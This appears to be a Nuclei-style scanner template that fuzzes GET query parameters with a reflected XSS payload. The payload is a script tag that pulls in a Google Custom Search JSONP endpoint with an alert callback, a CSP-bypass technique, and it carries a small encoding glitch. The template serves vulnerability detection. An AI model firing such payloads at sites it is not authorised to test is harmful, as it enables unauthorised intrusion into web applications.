id: fuzz-reflection-xss-google-script

info:
  name: XSS Detection with External Script
  author: netbaan
  severity: low
  description: |
    This template detects potential XSS vulnerabilities via reflection using an external script payload.

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'  # Run only on GET requests

    payloads:
      xss_payload:
        - "<script src=\"https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1â€¦)\" ></script>"

    stop-at-first-match: true

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{xss_payload}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{xss_payload}}"

      - type: word
        part: header
        words:
          - "text/html"